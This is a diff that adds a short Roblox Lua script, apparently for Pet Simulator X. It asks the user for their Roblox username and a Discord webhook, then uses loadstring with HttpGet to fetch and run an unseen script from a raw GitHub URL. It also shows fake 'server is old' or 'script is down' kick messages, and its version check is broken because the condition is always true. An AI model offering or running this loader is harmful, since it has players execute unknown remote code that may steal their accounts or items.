@@ -1,0 +1,14 @@
+```if game.RobloxReplicatedStorage.GetServerVersion:InvokeServer() == "0.554.0.5540504 (4d7f4a)" then
+    if game.PlaceVersion == 905 or 141 or 274 then
+        UserName = "your roblox username"
+        WebHook = "your discord webhook"
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+    else
+        game.Players.LocalPlayer:Kick("THIS SERVER IS OLD - JOINING ANOTHER SERVER IN 5 SECONDS")
+        wait(5)
+        game.TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
+    end
+else
+    game.Players.LocalPlayer:Kick("SCRIPT IS DOWN - TRY AGAIN LATER")
+end```
